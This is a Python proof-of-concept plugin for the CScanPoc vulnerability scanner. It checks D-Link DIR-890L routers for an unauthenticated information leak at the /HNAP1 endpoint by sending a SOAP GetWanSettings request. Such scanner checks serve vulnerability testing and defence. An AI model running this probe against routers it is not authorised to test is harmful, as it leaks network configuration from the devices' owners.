# coding: utf-8
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'D-Link_0101'  # 平台漏洞编号，留空
    name = 'D-Link DIR-890L /HNAP1 未授权信息泄漏'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-04-24'  # 漏洞公布时间
    desc = '''
    D-Link DIR-890L /HNAP1 未授权信息泄漏漏洞。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/vuls/64521.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DIR-890L'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '63a19ce7-2c04-406b-be3c-56a9ecd4e645'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = '%s/HNAP1/' % self.target
            soap = {'SOAPAction': '"http://purenetworks.com/HNAP1/GetWanSettings"'}
            req = requests.get(verify_url, headers=soap)
            if req.status_code == 200 and 'xmlns:soap' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
